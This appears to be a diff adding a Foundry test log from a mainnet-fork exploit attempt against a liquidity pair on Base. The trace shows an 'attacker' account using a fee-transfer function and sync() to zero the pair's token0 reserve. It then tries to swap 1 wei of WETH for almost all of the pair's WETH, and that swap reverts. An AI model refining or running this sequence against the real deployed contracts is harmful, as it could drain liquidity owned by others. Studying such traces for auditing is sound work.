@@ -1,0 +1,135 @@
+Compiling 20 files with Solc 0.8.24
+Solc 0.8.24 finished in 5.76s
+Compiler run successful!
+
+Ran 1 test for test/DebugOne.t.sol:DebugOne
+[FAIL: custom error 0xbb55fd27] test_debug_steps() (block: 52589159) (gas: 482317)
+Logs:
+  t0: 0x38f04E34b3E6F11C2bdF7A19D6558B3473c61362
+  t1: 0x4200000000000000000000000000000000000006
+  factory: 0x169C06b4cfB09bFD73A81e6f2Bb1eB514D75bB19
+  t0_balance_of_pair: 1
+  t1_balance_of_pair: 3085193556048010
+  r0: 1
+  r1: 3085193556048010
+  fees_contract_balance_t0: 9679975746147431613770175
+  fees_contract_balance_t1: 16650000000000
+  pair_totalSupply: 820064680900765802094
+  pair_lp_balance_of_pair: 0
+  tf_return: 1
+  t0_balance_after_tf: 0
+  reserve0_after_sync: 0
+  reserve1_after_sync: 3085193556048010
+  weth_deposit_ok: yes
+  attacker_weth: 1
+
+Traces:
+  [482317] DebugOne::test_debug_steps()
+    ├─ [0] VM::envOr("BASE_RPC_URL", "https://mainnet.base.org") [staticcall]
+    │   └─ ← [Return] <env var value>
+    ├─ [0] VM::createSelectFork("<rpc url>")
+    │   └─ ← [Return] 0
+    ├─ [351] 0xC6AC0110084f6cA058bFaA741Aa68Be5189A8Ca4::token0() [staticcall]
+    │   └─ ← [Return] 0x38f04E34b3E6F11C2bdF7A19D6558B3473c61362
+    ├─ [371] 0xC6AC0110084f6cA058bFaA741Aa68Be5189A8Ca4::token1() [staticcall]
+    │   └─ ← [Return] 0x4200000000000000000000000000000000000006
+    ├─ emit log_named_address(key: "t0", val: 0x38f04E34b3E6F11C2bdF7A19D6558B3473c61362)
+    ├─ emit log_named_address(key: "t1", val: 0x4200000000000000000000000000000000000006)
+    ├─ [327] 0xC6AC0110084f6cA058bFaA741Aa68Be5189A8Ca4::factory() [staticcall]
+    │   └─ ← [Return] 0x169C06b4cfB09bFD73A81e6f2Bb1eB514D75bB19
+    ├─ emit log_named_address(key: "factory", val: 0x169C06b4cfB09bFD73A81e6f2Bb1eB514D75bB19)
+    ├─ [2623] 0x38f04E34b3E6F11C2bdF7A19D6558B3473c61362::balanceOf(0xC6AC0110084f6cA058bFaA741Aa68Be5189A8Ca4) [staticcall]
+    │   └─ ← [Return] 1
+    ├─ emit log_named_uint(key: "t0_balance_of_pair", val: 1)
+    ├─ [2457] 0x4200000000000000000000000000000000000006::balanceOf(0xC6AC0110084f6cA058bFaA741Aa68Be5189A8Ca4) [staticcall]
+    │   └─ ← [Return] 3085193556048010 [3.085e15]
+    ├─ emit log_named_uint(key: "t1_balance_of_pair", val: 3085193556048010 [3.085e15])
+    ├─ [6620] 0xC6AC0110084f6cA058bFaA741Aa68Be5189A8Ca4::getReserves() [staticcall]
+    │   └─ ← [Return] 1, 3085193556048010 [3.085e15], 1790481017 [1.79e9]
+    ├─ emit log_named_uint(key: "r0", val: 1)
+    ├─ emit log_named_uint(key: "r1", val: 3085193556048010 [3.085e15])
+    ├─ [328] 0xC6AC0110084f6cA058bFaA741Aa68Be5189A8Ca4::fees() [staticcall]
+    │   └─ ← [Return] 0x07360Cb207F829f8352a42d6a5b364C7EEc389DA
+    ├─ [2623] 0x38f04E34b3E6F11C2bdF7A19D6558B3473c61362::balanceOf(0x07360Cb207F829f8352a42d6a5b364C7EEc389DA) [staticcall]
+    │   └─ ← [Return] 9679975746147431613770175 [9.679e24]
+    ├─ emit log_named_uint(key: "fees_contract_balance_t0", val: 9679975746147431613770175 [9.679e24])
+    ├─ [328] 0xC6AC0110084f6cA058bFaA741Aa68Be5189A8Ca4::fees() [staticcall]
+    │   └─ ← [Return] 0x07360Cb207F829f8352a42d6a5b364C7EEc389DA
+    ├─ [2457] 0x4200000000000000000000000000000000000006::balanceOf(0x07360Cb207F829f8352a42d6a5b364C7EEc389DA) [staticcall]
+    │   └─ ← [Return] 16650000000000 [1.665e13]
+    ├─ emit log_named_uint(key: "fees_contract_balance_t1", val: 16650000000000 [1.665e13])
+    ├─ [2341] 0xC6AC0110084f6cA058bFaA741Aa68Be5189A8Ca4::totalSupply() [staticcall]
+    │   └─ ← [Return] 820064680900765802094 [8.2e20]
+    ├─ emit log_named_uint(key: "pair_totalSupply", val: 820064680900765802094 [8.2e20])
+    ├─ [2602] 0xC6AC0110084f6cA058bFaA741Aa68Be5189A8Ca4::balanceOf(0xC6AC0110084f6cA058bFaA741Aa68Be5189A8Ca4) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ emit log_named_uint(key: "pair_lp_balance_of_pair", val: 0)
+    ├─ [2623] 0x38f04E34b3E6F11C2bdF7A19D6558B3473c61362::balanceOf(0xC6AC0110084f6cA058bFaA741Aa68Be5189A8Ca4) [staticcall]
+    │   └─ ← [Return] 1
+    ├─ [78880] 0xC6AC0110084f6cA058bFaA741Aa68Be5189A8Ca4::_transferFeesSupportingTaxTokens(0x38f04E34b3E6F11C2bdF7A19D6558B3473c61362, 1)
+    │   ├─ [2623] 0x38f04E34b3E6F11C2bdF7A19D6558B3473c61362::balanceOf(0x07360Cb207F829f8352a42d6a5b364C7EEc389DA) [staticcall]
+    │   │   └─ ← [Return] 9679975746147431613770175 [9.679e24]
+    │   ├─ [49583] 0x38f04E34b3E6F11C2bdF7A19D6558B3473c61362::transfer(0x07360Cb207F829f8352a42d6a5b364C7EEc389DA, 1)
+    │   │   ├─ emit Transfer(from: 0xC6AC0110084f6cA058bFaA741Aa68Be5189A8Ca4, to: 0x07360Cb207F829f8352a42d6a5b364C7EEc389DA, amount: 1)
+    │   │   └─ ← [Return] true
+    │   ├─ [623] 0x38f04E34b3E6F11C2bdF7A19D6558B3473c61362::balanceOf(0x07360Cb207F829f8352a42d6a5b364C7EEc389DA) [staticcall]
+    │   │   └─ ← [Return] 9679975746147431613770176 [9.679e24]
+    │   └─ ← [Return] 1
+    ├─ emit log_named_uint(key: "tf_return", val: 1)
+    ├─ [2623] 0x38f04E34b3E6F11C2bdF7A19D6558B3473c61362::balanceOf(0xC6AC0110084f6cA058bFaA741Aa68Be5189A8Ca4) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ emit log_named_uint(key: "t0_balance_after_tf", val: 0)
+    ├─ [140138] 0xC6AC0110084f6cA058bFaA741Aa68Be5189A8Ca4::sync()
+    │   ├─ [2623] 0x38f04E34b3E6F11C2bdF7A19D6558B3473c61362::balanceOf(0xC6AC0110084f6cA058bFaA741Aa68Be5189A8Ca4) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [2457] 0x4200000000000000000000000000000000000006::balanceOf(0xC6AC0110084f6cA058bFaA741Aa68Be5189A8Ca4) [staticcall]
+    │   │   └─ ← [Return] 3085193556048010 [3.085e15]
+    │   ├─ emit Sync(: 0, : 3085193556048010 [3.085e15])
+    │   └─ ← [Stop]
+    ├─ [6620] 0xC6AC0110084f6cA058bFaA741Aa68Be5189A8Ca4::getReserves() [staticcall]
+    │   └─ ← [Return] 0, 3085193556048010 [3.085e15], 1791967665 [1.791e9]
+    ├─ emit log_named_uint(key: "reserve0_after_sync", val: 0)
+    ├─ emit log_named_uint(key: "reserve1_after_sync", val: 3085193556048010 [3.085e15])
+    ├─ [0] VM::addr(<pk>) [staticcall]
+    │   └─ ← [Return] attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]
+    ├─ [0] VM::label(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], "attacker")
+    │   └─ ← [Return]
+    ├─ [0] VM::deal(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], 1)
+    │   └─ ← [Return]
+    ├─ [0] VM::prank(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
+    │   └─ ← [Return]
+    ├─ [44866] 0x4200000000000000000000000000000000000006::deposit{value: 1}()
+    │   ├─ emit Deposit(dst: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], wad: 1)
+    │   └─ ← [Stop]
+    ├─ emit log_named_string(key: "weth_deposit_ok", val: "yes")
+    ├─ [2457] 0x4200000000000000000000000000000000000006::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
+    │   └─ ← [Return] 1
+    ├─ emit log_named_uint(key: "attacker_weth", val: 1)
+    ├─ [0] VM::startPrank(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
+    │   └─ ← [Return]
+    ├─ [34173] 0x4200000000000000000000000000000000000006::transfer(0xC6AC0110084f6cA058bFaA741Aa68Be5189A8Ca4, 1)
+    │   ├─ emit Transfer(from: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], to: 0xC6AC0110084f6cA058bFaA741Aa68Be5189A8Ca4, amount: 1)
+    │   └─ ← [Return] true
+    ├─ [37358] 0xC6AC0110084f6cA058bFaA741Aa68Be5189A8Ca4::swap(0, 3085193556048009 [3.085e15], attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], 0x)
+    │   ├─ [2460] 0x169C06b4cfB09bFD73A81e6f2Bb1eB514D75bB19::isPaused() [staticcall]
+    │   │   └─ ← [Return] false
+    │   └─ ← [Revert] InsufficientLiquidity()
+    └─ ← [Revert] InsufficientLiquidity()
+
+Backtrace:
+  at 0xC6AC0110084f6cA058bFaA741Aa68Be5189A8Ca4.swap
+  at DebugOne.test_debug_steps
+
+Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 59.15s (59.15s CPU time)
+
+Ran 1 test suite in 74.73s (59.15s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)
+
+Failing tests:
+Encountered 1 failing test in test/DebugOne.t.sol:DebugOne
+[FAIL: custom error 0xbb55fd27] test_debug_steps() (block: 52589159) (gas: 482317)
+
+Encountered a total of 1 failing tests, 0 tests succeeded
+
+Tip: Run `forge test --rerun` to retry only the 1 failed test
+Tip: Run `forge test --debug --match-test <TEST_NAME>` to inspect one failing test in the debugger
+EXIT=1
